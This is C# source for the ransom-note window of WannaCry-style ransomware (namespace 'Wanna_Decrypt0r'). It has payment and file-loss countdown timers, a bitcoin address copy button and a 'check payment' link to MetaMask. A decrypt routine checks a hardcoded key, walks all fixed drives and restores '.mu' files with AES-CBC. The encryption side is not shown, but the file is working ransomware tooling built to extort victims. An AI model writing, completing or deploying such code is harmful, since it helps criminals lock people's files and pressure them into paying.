using System;
using System.ComponentModel;
using System.Drawing;
using System.Net;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.IO;
using System.Text;
using System.Collections.Generic;

namespace Wanna_Decrypt0r_vN5._0
{
    public partial class MainForm : Form
    {
        private Timer countdownTimer;
        private TimeSpan paymentTimeLeft;
        private TimeSpan lossTimeLeft;
        public MainForm()
        {
            InitializeComponent();

            // Only run at runtime, not in designer
            if (LicenseManager.UsageMode != LicenseUsageMode.Designtime)
            {
                try
                {
                    string imageUrl = "https://cdn-icons-png.flaticon.com/512/6174/6174021.png";
                    using (var webClient = new WebClient())
                    {
                        using (var stream = webClient.OpenRead(imageUrl))
                        {
                            picLock.Image = Image.FromStream(stream);
                        }
                    }
                }
                catch
                {
                    picLock.Image = SystemIcons.Warning.ToBitmap();
                }
            }
            paymentTimeLeft = new TimeSpan(3, 0, 0, 0); // 3 days
            lossTimeLeft = new TimeSpan(7, 0, 0, 0);    // 7 days
            UpdateCountdownLabels();

            // Setup timer
            countdownTimer = new Timer();
            countdownTimer.Interval = 1000; // 1 second
            countdownTimer.Tick += CountdownTimer_Tick;
            countdownTimer.Start();
        }
        private void CountdownTimer_Tick(object sender, EventArgs e)
        {
            if (paymentTimeLeft.TotalSeconds > 0)
                paymentTimeLeft = paymentTimeLeft.Subtract(TimeSpan.FromSeconds(1));
            if (lossTimeLeft.TotalSeconds > 0)
                lossTimeLeft = lossTimeLeft.Subtract(TimeSpan.FromSeconds(1));

            UpdateCountdownLabels();

            // Optionally stop timer if both reach zero
            if (paymentTimeLeft.TotalSeconds <= 0 && lossTimeLeft.TotalSeconds <= 0)
                countdownTimer.Stop();
            // Cập nhật ngày giờ hiện tại
            lblLossCurrentTime.Text = "Current: " + DateTime.Now.ToString("M/d/yyyy HH:mm:ss");
        }
        private void UpdateCountdownLabels()
        {
            lblTimer1.Text = string.Format("{0:D2}:{1:D2}:{2:D2}:{3:D2}",
                paymentTimeLeft.Days,
                paymentTimeLeft.Hours,
                paymentTimeLeft.Minutes,
                paymentTimeLeft.Seconds);

            lblTimer2.Text = string.Format("{0:D2}:{1:D2}:{2:D2}:{3:D2}",
                lossTimeLeft.Days,
                lossTimeLeft.Hours,
                lossTimeLeft.Minutes,
                lossTimeLeft.Seconds);
        }
        private void btnCheckPayment_Click(object sender, EventArgs e)
        {
            try
            {
                System.Diagnostics.Process.Start("https://metamask.io/en-GB");
            }
            catch
            {
                try
                {
                    System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
                    {
                        FileName = "https://metamask.io/en-GB",
                        UseShellExecute = true
                    });
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Cannot open browser: " + ex.Message);
                }
            }
        }

        private void btnCopyBitcoin_Click(object sender, EventArgs e)
        {
            if (!string.IsNullOrEmpty(txtBitcoin.Text))
            {
                Clipboard.SetText(txtBitcoin.Text);
                MessageBox.Show("Copied to clipboard!", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        private static readonly string[] EXCLUDE_DIRS = new string[]
        {
            @"C:\Windows", @"C:\Program Files", @"C:\Program Files (x86)", @"C:\ProgramData",@"C:\$Recycle.Bin"
        };

        private const string ENCRYPTED_EXTENSION = ".mu";
        private const string RAW_KEY_STRING = "TWpJMU1qQTBOekVrTWpJMU1qQTBORFFq";

        private void btnDecrypt_Click(object sender, EventArgs e)
        {
            string keyInput = txtDecryptKey.Text;
            if (string.IsNullOrEmpty(keyInput))
            {
                MessageBox.Show("Please enter the decryption key.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            if (keyInput != RAW_KEY_STRING)
            {
                MessageBox.Show("Invalid decryption key. Please check and try again.", "Access Denied", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                txtDecryptKey.Clear();
                txtDecryptKey.Focus();
                return;
            }

            // Create key SHA-256 from RAW_KEY_STRING
            byte[] key;
            using (SHA256 sha256 = SHA256.Create())
            {
                key = sha256.ComputeHash(Encoding.UTF8.GetBytes(RAW_KEY_STRING));
            }

            List<string> drives = new List<string>();
            foreach (var drive in DriveInfo.GetDrives())
            {
                if (drive.DriveType == DriveType.Fixed)
                    drives.Add(drive.Name);
            }

            int success = 0, fail = 0;
            foreach (string drive in drives)
            {
                List<string> files = new List<string>();
                SafeGetFiles(drive, "*" + ENCRYPTED_EXTENSION, files);

                foreach (string file in files)
                {
                    try
                    {
                        DecryptFileInplace(file, key);
                        success++;
                    }
                    catch
                    {
                        fail++;
                    }
                }
            }

            MessageBox.Show($"Decryption completed.\nSuccess: {success}\nFailed: {fail}", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void SafeGetFiles(string dir, string pattern, List<string> files)
        {
            try
            {
                string normalizedDir = Path.GetFullPath(dir).TrimEnd('\\').ToLower();
                foreach (var exclude in EXCLUDE_DIRS)
                {
                    if (normalizedDir.StartsWith(exclude.ToLower()))
                        return;
                }

                files.AddRange(Directory.GetFiles(dir, pattern));
                foreach (var subDir in Directory.GetDirectories(dir))
                {
                    SafeGetFiles(subDir, pattern, files);
                }
            }
            catch
            {
                // Skip inaccessible folders
            }
        }

        private void DecryptFileInplace(string filePath, byte[] key)
        {
            using (FileStream fs = new FileStream(filePath, FileMode.Open, FileAccess.Read))
            {
                byte[] iv = new byte[16];
                fs.Read(iv, 0, 16);
                byte[] encryptedData = new byte[fs.Length - 16];
                fs.Read(encryptedData, 0, encryptedData.Length);

                using (Aes aes = Aes.Create())
                {
                    aes.Key = key;
                    aes.IV = iv;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;

                    using (MemoryStream ms = new MemoryStream())
                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(encryptedData, 0, encryptedData.Length);
                        cs.FlushFinalBlock();
                        byte[] decrypted = ms.ToArray();

                        string originalPath = filePath.Substring(0, filePath.Length - ENCRYPTED_EXTENSION.Length);
                        File.WriteAllBytes(originalPath, decrypted);
                    }
                }
            }
            File.Delete(filePath);
        }
    }
}